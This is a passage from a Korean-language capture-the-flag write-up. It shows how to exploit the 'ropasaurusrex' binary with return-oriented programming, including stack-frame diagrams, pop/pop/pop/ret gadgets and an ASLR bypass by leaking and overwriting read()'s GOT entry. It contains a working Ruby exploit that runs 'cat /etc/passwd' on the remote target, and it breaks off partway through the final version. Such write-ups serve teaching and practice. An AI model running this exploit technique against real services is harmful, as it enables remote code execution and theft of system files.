<p>이제 우린 <code>cat /etc/passwd</code>를 메모리에 썼고, <code>system()</code>을 호출해서 저 주소를 가리키면 된다. 거의 다 됐다. ASLR이 적용되지 않았다면 쉽다. 실행 파일에는 libc가 링크되어 있다:</p>

<p>``` sh
$ ldd ./ropasaurusrex</p>

<pre><code>    linux-gate.so.1 =&gt;  (0xb7703000)
    libc.so.6 =&gt; /lib/i686/cmov/libc.so.6 (0xb75aa000)
    /lib/ld-linux.so.2 (0xb7704000)
</code></pre>

<p>```</p>

<p>그리고 <code>libc.so.6</code>엔 <code>system()</code> 함수가 포함되어 있다:</p>

<p><code>sh
$ objdump -T /lib/i686/cmov/libc.so.6 | grep system
000f5470 g    DF .text  00000042  GLIBC_2.0   svcerr_systemerr
00039450 g    DF .text  0000007d  GLIBC_PRIVATE __libc_system
00039450  w   DF .text  0000007d  GLIBC_2.0   system
</code></p>

<p>디버거를 통해 ropasaurusrex에서 로드된 <code>system()</code> 주소를 알아낼 수 있다:</p>

<p>``` sh
$ gdb &mdash;quiet ./ropasaurusrex core
[&hellip;]
Program terminated with signal 11, Segmentation fault.</p>

<h1>0  0x43434343 in ?? ()</h1>

<p>(gdb) x/x system
0xb7ec2450 <system>:    0x890cec83
```</p>

<p><code>system()</code>은 인자를 하나만 받으므로, 스택 프레임을 만드는 건 쉬운 편이다:</p>

<p>``` plain
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          | &ndash; 상관 없다, 다른 함수들이 여기 올 것이다.
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; system()의 스택 프레임 시작
|      void *arg       | &ndash; buffer, 0x08049530
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|   [return address]   | &ndash; &lsquo;system'이 반환되는 주소
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          | &ndash; 상관 없다, system() 지역 변수를 위해 사용할 것이다.
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
```</p>

<p>이제 이걸 <code>read()</code> 프레임 위에 쌓으면 제법 괜찮아 보인다:</p>

<p>``` plain
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; system()의 스택 프레임 시작
|      void *arg       |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|   [return address]   |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; read()의 프레임 시작
|     size_t count     |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|      void *buf       |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|        int fd        |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| [address of system]  | &lt;&mdash; 스택 포인터
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
```</p>

<p><code>read()</code>가 반환하는 순간, 스택 포인터의 위치는 위에 나타낸 대로다. <code>read()</code>가 반환하면, 반환 주소를 스택에서 뽑아 그리로 점프한다. 반환하면 스택은 이렇게 보일 것이다:</p>

<p>``` plain
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; system()의 프레임 시작
|      void *arg       |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|   [return address]   |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; read()의 프레임 시작
|     size_t count     |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|      void *buf       |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|        int fd        | &lt;&mdash; 스택 포인터
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| [address of system]  |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
```</p>

<p>어라, 이건 좋지 않다! <code>system()</code>에 진입할 때, 스택 포인터는 우리가 원하는 <code>system()</code> 프레임 바닥이 아닌 <code>read()</code> 프레임의 안쪽을 가리키고 있다. 어떻게 해야 할까?</p>

<p>사실, ROP 익스플로잇을 수행할 때, <code>pop/pop/ret</code>이라는 굉장히 중요한 구조가 있다. 이 경우엔 <code>pop/pop/pop/ret</code>이며 이걸 줄여 &ldquo;pppr"이라고 하자. 스택을 비우기에 충분한 "pop"들 뒤에 return이라는 것만 기억해라.</p>

<p>스택에서 원하지 않는 것들을 지우기 위해 <code>pop/pop/pop/ret</code>을 사용한다. <code>read()</code>는 인자를 3개 받으므로, 우린 스택에서 그 셋을 모두 뽑은 다음 반환해야 한다. 설명을 위해 <code>read()</code>가 <code>pop/pop/pop/ret</code>으로 반환한 직후의 스택을 그려보자면 이렇다:</p>

<p>``` plain
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; system()의 프레임 시작
|      void *arg       |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|   [return address]   |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; pop/pop/pop/ret을 위한 특별한 프레임
| [address of system]  |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; read()의 프레임 시작
|     size_t count     |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|      void *buf       |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|        int fd        | &lt;&mdash; 스택 포인터
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| [address of &ldquo;pppr&rdquo;]  |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
```</p>

<p>&ldquo;pop/pop/pop/ret"이 실행되고, 반환하기 직전엔 다음과 같다:</p>

<p>``` plain
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; system()의 프레임 시작
|      void *arg       |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|   [return address]   |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; pop/pop/pop/ret의 프레임
| [address of system]  | &lt;&mdash; 스택 포인터
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|     size_t count     | &lt;&mdash; read()의 프레임
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|      void *buf       |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|        int fd        |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| [address of &ldquo;pppr&rdquo;]  |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
```</p>

<p>반환하고 나면, 정확히 우리가 원하는 것을 얻을 수 있다:</p>

<p>``` plain
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; system()의 프레임 시작
|      void *arg       |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|   [return address]   | &lt;&mdash; 스택 포인터
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; pop/pop/pop/ret의 프레임
| [address of system]  |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; read()의 프레임 시작
|     size_t count     |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|      void *buf       |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|        int fd        |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| [address of &ldquo;pppr&rdquo;]  |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
```</p>

<p><code>pop/pop/pop/ret</code>은 <code>objdump</code>를 이용하면 어렵지 않게 찾을 수 있다:</p>

<p><code>sh
$ objdump -d ./ropasaurusrex | egrep 'pop|ret'
[...]
 80484b5:       5b                      pop    ebx
 80484b6:       5e                      pop    esi
 80484b7:       5f                      pop    edi
 80484b8:       5d                      pop    ebp
 80484b9:       c3                      ret
</code></p>

<p>이건 다음 함수를 실행할 때 1~4개의 인자를 스택에서 지울 수 있게 해준다. 완벽하다!</p>

<p>그리고 이걸 직접 따라해 보고 있다면, pop들이 연속한 주소에 있어야 한다는 걸 기억해라. 그래서 <code>egrep</code>으로 찾는 것은 약간 위험하다.</p>

<p>이제 우리는 세 개의 <code>pop</code>과 <code>ret</code>이 필요하면 (<code>read()</code>가 사용한 세 개의 인자를 지우기 위해) 주소 <code>0x80484b6</code>을 사용하면 될 것이다. 그러면 스택은 이렇게 될 것이다:</p>

<p>``` plain
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; system()의 프레임 시작
|      void *arg       | &ndash; 0x08049530 (buf)
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|   [return address]   | &ndash; 0x44444444
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| [address of system]  | &ndash; 0xb7ec2450
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; read()의 프레임 시작
|     size_t count     | &ndash; strlen(cmd)
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|      void *buf       | &ndash; 0x08049530 (buf)
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|        int fd        | &ndash; 0 (stdin)
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| [address of &ldquo;pppr&rdquo;]  | &ndash; 0x080484b6
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
```</p>

<p>원격 서버에서 보내는 걸 받기 위해 <code>s.read()</code>를 익스플로잇 마지막에 추가하자. 현재 익스플로잇은 다음과 같다:</p>

<p>``` ruby
require &lsquo;socket&rsquo;</p>

<p>s = TCPSocket.new(&ldquo;localhost&rdquo;, 4444)</p>

<h1>The command we&rsquo;ll run</h1>

<p>cmd = ARGV<a href="https://en.wikipedia.org/wiki/Zero_page">0</a> + &ldquo;\0&rdquo;</p>

<h1>From objdump -x</h1>

<p>buf = 0x08049530</p>

<h1>From objdump -D ./ropasaurusrex | grep read</h1>

<p>read_addr = 0x0804832C</p>

<h1>From objdump -D ./ropasaurusrex | grep write</h1>

<p>write_addr = 0x0804830C</p>

<h1>From gdb, &ldquo;x/x system&rdquo;</h1>

<p>system_addr = 0xb7ec2450</p>

<h1>From objdump, &ldquo;pop/pop/pop/ret&rdquo;</h1>

<p>pppr_addr = 0x080484b6</p>

<h1>Generate the payload</h1>

<p>payload = &ldquo;A&rdquo;*140 +
  [</p>

<pre><code># system()'s stack frame
buf,         # writable memory (cmd buf)
0x44444444,  # system()'s return address

# pop/pop/pop/ret's stack frame
system_addr, # pop/pop/pop/ret's return address

# read()'s stack frame
cmd.length,  # number of bytes
buf,         # writable memory (cmd buf)
0,           # stdin
pppr_addr,   # read()'s return address

read_addr # Overwrite the original return
</code></pre>

<p>  ].reverse.pack(&ldquo;I*&rdquo;) # Convert a series of &lsquo;ints&rsquo; to a string</p>

<h1>Write the &lsquo;exploit&rsquo; payload</h1>

<p>s.write(payload)</p>

<h1>When our payload calls read() the first time, this is read</h1>

<p>s.write(cmd)</p>

<h1>Read the response from the command and print it to the screen</h1>

<p>puts(s.read)</p>

<h1>Clean up</h1>

<p>s.close()
```</p>

<p>그리고 실행하게 되면, 예상대로 나온다:</p>

<p><code>sh
$ ruby sploit.rb "cat /etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
...
</code></p>

<p>그리고 <a href="https://en.wikipedia.org/wiki/Core_dump">코어 덤프</a>를 보면, 예상한 대로 <code>0x44444444</code>에서 크래시를 일으킨다.</p>

<p>끝났다, 그렇지?</p>

<p>실은 틀렸다!</p>

<p>이 익스플로잇은 내 테스트 기기에서 완벽하게 작동하지만, ASLR이 적용되었다면 실패한다:</p>

<p><code>sh
$ sudo sysctl -w kernel.randomize_va_space=1
kernel.randomize_va_space = 1
ron@debian-x86 ~ $ ruby sploit.rb "cat /etc/passwd"
</code></p>

<p>여기서부터 조금 더 복잡해진다. 가보자!</p>

<h2>ASLR이 뭐야?</h2>

<p>ASLR&mdash;주소 공간 레이아웃 불규칙화(address space layout randomization)&mdash;은 현대 시스템(FreeBSD는 제외)에 구현된 방어 기법으로, 라이브러리가 로드 되는 주소를 불규칙화 한다. 그 예로, ropasaurusrex를 두 번 실행하고 <code>system()</code>의 주소를 알아내 보자:</p>

<p>``` sh
ron@debian-x86 ~ $ perl -e &lsquo;printf &ldquo;A"x1000&rsquo; | ./ropasaurusrex
Segmentation fault (core dumped)
ron@debian-x86 ~ $ gdb ./ropasaurusrex core
Program terminated with signal 11, Segmentation fault.</p>

<h1>0  0x41414141 in ?? ()</h1>

<p>(gdb) x/x system
0xb766e450 <system>:    0x890cec83</p>

<p>ron@debian-x86 ~ $ perl -e &lsquo;printf &ldquo;A"x1000&rsquo; | ./ropasaurusrex
Segmentation fault (core dumped)
ron@debian-x86 ~ $ gdb ./ropasaurusrex core
Program terminated with signal 11, Segmentation fault.</p>

<h1>0  0x41414141 in ?? ()</h1>

<p>(gdb) x/x system
0xb76a7450 <system>:    0x890cec83
```</p>

<p><code>system()</code>의 주소가 <code>0xb766e450</code>에서 <code>0xb76a7450</code>으로 바뀐 것을 보라. 이게 문제다!</p>

<h2>ASLR 정복</h2>

<p>그래서, 뭘 해야 할까? 사실, 바이너리 자체는 ASLR이 적용되지 않아서, 유용하게도 거기 있는 모든 주소는 그대로 머물러 있다고 믿을 수 있다. 아주 중요하게도, 재배치(relocation) 테이블은 같은 주소에 남아있다:</p>

<p>``` sh
$ objdump -R ./ropasaurusrex</p>

<p>./ropasaurusrex:     file format elf32-i386</p>

<p>DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049600 R_386_GLOB_DAT    <strong>gmon_start</strong>
08049610 R_386_JUMP_SLOT   <strong>gmon_start</strong>
08049614 R_386_JUMP_SLOT   write
08049618 R_386_JUMP_SLOT   __libc_start_main
0804961c R_386_JUMP_SLOT   read
```</p>

<p>이렇게 <code>read()</code>와 <code>write()</code>의 주소&mdash;바이너리 안에 있는&mdash;를 알게 되었다. 이게 뭘 의미하느냐? 바이너리가 실행 중일 때 이들의 값을 살펴보자:</p>

<p><code>sh
$ gdb ./ropasaurusrex
(gdb) run
^C
Program received signal SIGINT, Interrupt.
0xb7fe2424 in __kernel_vsyscall ()
(gdb) x/x 0x0804961c
0x804961c:      0xb7f48110
(gdb) print read
$1 = {&lt;text variable, no debug info&gt;} 0xb7f48110 &lt;read&gt;
</code></p>

<p>보라.. <code>read()</code>를 가리키는 포인터가 우리가 알고 있는 메모리 주소에 있다! 이걸로 뭘 할지 궁금한가&hellip;? 힌트를 하나 주겠다: 우리는 <code>write()</code> 함수&mdash;주소를 아는 또 하나의 함수&mdash;를 사용해 임의의 메모리에서 데이터를 가져와 소켓에 쓸 수 있다.</p>

<h2>드디어, 코드 실행!</h2>

<p>좋다, 잠깐 멈추고, 단계를 나누자. 우리는 이와 같은 과정이 필요하다:</p>

<ol>
<li><code>read()</code> 함수를 이용해 명령어를 메모리에 복사</li>
<li><code>write()</code> 함수를 이용해 <code>write()</code> 함수의 주소 구하기</li>
<li><code>system()</code> 주소를 구하기 위해 <code>write()</code>과 <code>system()</code>의 오프셋 계산</li>
<li><code>system()</code> 호출</li>
</ol>


<p><code>system()</code>을 호출하려면, <code>system()</code>의 주소를 메모리 어딘가에 쓰고, 그걸 호출해야 한다. 가장 쉬운 방법은 <code>.plt</code> 테이블의 <code>read()</code> 호출을 덮어쓰고 <code>read()</code>를 호출하는 것이다.</p>

<p>지금 아마도 조금 혼란스러울 것이다. 하지만 나도 그랬으니 걱정하지 마라. 난 이게 된다는 사실에 충격받았다. :)</p>

<p>잠시 멈추고 이걸 이해해 보자! 이건 우리가 원하는 스택 프레임일 것이다:</p>

<p>``` plain
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; system()의 프레임 [7]
|      void *arg       |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|   [return address]   |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; pop/pop/pop/ret의 프레임 [6]
|  [address of read]   | &ndash; 사실은 system()으로 점프할 것이다.
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; 두 번째 read()의 프레임 [5]
|     size_t count     | &ndash; 4바이트 (32비트 주소의 크기)
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|      void *buf       | &ndash; read()를 가리키는 덮어쓸 수 있는 포인터
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|        int fd        | &ndash; 0 (stdin)
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| [address of &ldquo;pppr&rdquo;]  |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; pop/pop/pop/ret의 프레임 [4]
|  [address of read]   |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; write()의 프레임 [3]
|     size_t count     | &ndash; 4바이트 (32비트 주소의 크기)
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|      void *buf       | &ndash; read()를 가리키는 포인터를 포함하는 주소
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|        int fd        | &ndash; 1 (stdout)
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| [address of &ldquo;pppr&rdquo;]  |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; pop/pop/pop/ret의 프레임 [2]
|  [address of write]  |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; read()의 프레임 [1]
|     size_t count     | &ndash; strlen(cmd)
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|      void *buf       | &ndash; 쓸 수 있는 메모리
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|        int fd        | &ndash; 0 (stdin)
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| [address of &ldquo;pppr&rdquo;]  |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
```</p>

<p>오 이런, 이게 대체 뭐야?</p>

<p>바닥에서 시작해서 올라가자! 말하기 쉽게 각 프레임에 숫자를 붙였다.</p>

<p>프레임 [1]은 전에 본 것이다. <code>cmd</code>를 쓸 수 있는 메모리에 기록한다. 프레임 [2]는 <code>read()</code>를 정리할 표준적인 <code>pop/pop/pop/ret</code>을 사용한다.</p>

<p>프레임 [3]은 <code>write()</code>를 사용해 소켓에 <code>read()</code> 주소를 쓴다. 프레임 [4]는 <code>write()</code> 후 정리할 표준적인 <code>pop/pop/pop/ret</code>을 사용한다.</p>

<p>프레임 [5]는 소켓을 통해 다른 주소를 읽고 그걸 메모리에 쓴다. 이 주소는 <code>system()</code> 호출 주소가 될 것이다. 이걸 메모리에 쓰는 게 작동하는 이유는 <code>read()</code>가 호출되는 방식 때문이다. 우리가 gdb (<code>0x0804832C</code>)에서 써 왔던 <code>read()</code> 호출 부분을 보면 이렇다:</p>

<p><code>sh
(gdb) x/i 0x0804832C
0x804832c &lt;read@plt&gt;:   jmp    DWORD PTR ds:0x804961c
</code></p>

<p><code>read()</code>는 사실 간접적인 점프로 구현되어 있다! 그러니 <code>ds:0x804961c</code>의 값이 무엇이든 이걸 바꿔도 그리로 점프하게 되고, 결국 우린 어디로든 점프할 수 있게 된다! 그래서 프레임 [3]에서 메모리로부터 주소를 읽고 (<code>read()</code>의 실제 주소를 얻기 위해) 프레임 [5]에서 그 주소에 새 주소를 쓰는 것이다.</p>

<p>프레임 [6]은 표준적인 <code>pop/pop/pop/ret</code> 구조지만 약간 다르다: <code>pop/pop/pop/ret</code>의 반환 주소가 실제론 <code>read()</code>의 <code>.plt</code> 엔트리인 <code>0x804832c</code>다. <code>read()</code>의 <code>.plt</code> 엔트리를 <code>system()</code>으로 덮어쓰기 때문에, 이 호출은 실제로 <code>system()</code>으로 가게 된다!</p>

<h2>최종 코드</h2>

<p>휴! 꽤 복잡했다. DEP와 ASLR을 모두 우회하며 ropasaurusrex의 익스플로잇을 모두 구현한 코드다:</p>

<p>``` ruby
require &lsquo;socket&rsquo;</p>

<p>s = TCPSocket.new(&ldquo;localhost&rdquo;, 4444)</p>

<h1>The command we&rsquo;ll run</h1>

<p>cmd = ARGV<a href="https://en.wikipedia.org/wiki/Zero_page">0</a> + &ldquo;\0&rdquo;</p>

<h1>From objdump -x</h1>

<p>buf = 0x08049530</p>

<h1>From objdump -D ./ropasaurusrex | grep read</h1>

<p>read_addr = 0x0804832C</p>

